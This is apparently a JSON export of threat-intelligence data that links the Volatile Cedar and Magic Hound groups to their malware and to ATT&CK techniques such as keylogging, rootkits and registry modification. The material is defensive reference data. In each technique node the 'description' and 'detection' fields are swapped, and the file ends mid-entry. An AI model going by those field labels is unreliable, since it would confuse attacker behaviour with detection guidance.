{
    "nodes": [
        {
            "id": "G0123",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Volatile Cedar",
                "aliases": [
                    "Lebanese Cedar"
                ],
                "description": "Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0572": "Caterpillar WebShell",
                    "S0569": "Explosive"
                },
                "techniques": {
                    "T1595.002": "Vulnerability Scanning",
                    "T1505.003": "Web Shell",
                    "T1190": "Exploit Public-Facing Application",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "T1069.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Groups",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Command Shell",
                "chain_phase": "execution",
                "description": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1112",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Modify Registry",
                "chain_phase": "defense-evasion",
                "description": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
                "detection": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1110",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Brute Force",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.",
                "detection": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1105",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Ingress Tool Transfer",
                "chain_phase": "command-and-control",
                "description": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1083",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "File and Directory Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.  Custom tools may also be used to gather file and directory information and interact with the Native API.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1082",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Information Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
                "detection": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1057",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1046",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Service Scanning",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",
                "detection": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1041",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration Over C2 Channel",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1033",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Owner/User Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nUtilities and commands that acquire this information include <code>whoami</code>. In Mac and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1016",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Network Configuration Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1014",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rootkit",
                "chain_phase": "defense-evasion",
                "description": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)",
                "detection": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware.  Rootkits have been seen for Windows, Linux, and Mac OS X systems.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Service Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using Tasklist, and \"net start\" using Net, but adversaries may also use other tools as well. Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Local System",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0572",
            "type": "tool",
            "attributes": {
                "name": "Caterpillar WebShell",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Caterpillar WebShell is a self-developed Web Shell tool created by the group Volatile Cedar.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1059.003": "Windows Command Shell",
                    "T1112": "Modify Registry",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1014": "Rootkit",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1573.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Symmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1071.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Web Protocols",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
                "detection": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1564.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hidden Files and Directories",
                "chain_phase": "defense-evasion",
                "description": "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.",
                "detection": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1056.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Keylogging",
                "chain_phase": "collection",
                "description": "Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.",
                "detection": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Network"
                ]
            }
        },
        {
            "id": "T1115",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Clipboard Data",
                "chain_phase": "collection",
                "description": "Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.",
                "detection": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API. OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1106",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Native API",
                "chain_phase": "execution",
                "description": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ",
                "detection": "Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1025",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Removable Media",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. \n\nSome adversaries may also use Automated Collection on removable media.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0569",
            "type": "tool",
            "attributes": {
                "name": "Explosive",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Explosive is a custom-made remote access tool used by the group Volatile Cedar. It was first identified in the wild in 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1564.001": "Hidden Files and Directories",
                    "T1056.001": "Keylogging",
                    "T1115": "Clipboard Data",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1025": "Data from Removable Media",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 12
        },
        {
            "id": "G0059",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Magic Hound",
                "aliases": [
                    "COBALT ILLUSION",
                    "Charming Kitten",
                    "ITG18",
                    "Phosphorus",
                    "Newscaster",
                    "APT35"
                ],
                "description": "Magic Hound is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, dating back as early as 2014. The group typically targets U.S. and Middle Eastern military organizations, as well as other government personnel, via complex social engineering campaigns.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0192": "Pupy",
                    "S0186": "DownPaper",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1589.001": "Credentials",
                    "T1586.002": "Email Accounts",
                    "T1585.002": "Email Accounts",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1571": "Non-Standard Port",
                    "T1564.003": "Hidden Window",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.002": "Spearphishing Link",
                    "T1560.001": "Archive via Utility",
                    "T1114.001": "Local Email Collection",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1098.002": "Exchange Email Delegate Permissions",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1071": "Application Layer Protocol",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "T1573.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Asymmetric Cryptography",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1569.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Execution",
                "chain_phase": "execution",
